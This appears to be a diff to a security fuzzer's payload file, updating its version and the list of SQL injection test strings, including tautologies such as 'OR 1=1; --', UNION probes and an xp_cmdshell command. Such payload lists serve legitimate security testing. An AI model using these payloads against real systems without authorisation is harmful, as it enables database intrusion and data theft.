@@ -3,7 +3,7 @@
 #
 # Copyright (C) 2009 
 # subere@uncon.org
-# Version 1.3
+# Version 1.4
 #
 
 P:HTT-PMT-UPP:Uppercase HTTP Methods:8
@@ -88,12 +88,12 @@ f(x)=%X x 257
 P:SQL-INJ:SQL Injection:16
 > Replacive Fuzzers | SQL Injection | Injection
 A
-a'
---
+A' 
+A' --
+A' OR 1=1; --
 @
 ?
 ' AND 1=0) UNION ALL
-' or 1=1
 ? or 1=1 --
 x' AND userid IS NULL; --
 x' AND email IS NULL; --
@@ -101,7 +101,7 @@ anything' OR 'x'='x
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
 x' AND members.email IS NULL; --
 x' OR full_name LIKE '%Bob%
-23 OR 1=1
+23 OR 1=1; --
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 
 P:SQL-ORA-CLE:Oracle SQL Injection:2
